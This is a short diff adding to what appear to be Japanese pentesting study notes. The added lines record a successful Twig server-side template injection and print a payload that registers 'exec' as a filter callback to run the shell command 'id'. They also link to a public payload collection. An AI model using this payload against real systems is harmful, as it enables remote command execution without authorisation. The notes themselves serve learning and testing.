@@ -86,4 +86,11 @@ https://github.com/TROUBLE-1/White-box-pentesting
 ```
 ![image](https://user-images.githubusercontent.com/56021519/112273054-425e0700-8cc0-11eb-9d65-b70dc6478770.png)  
 
+以下で成功！  
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection  
+```txt
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+![image](https://user-images.githubusercontent.com/56021519/112273908-39216a00-8cc1-11eb-9dd6-cb89f5f5c89e.png)  
+
 
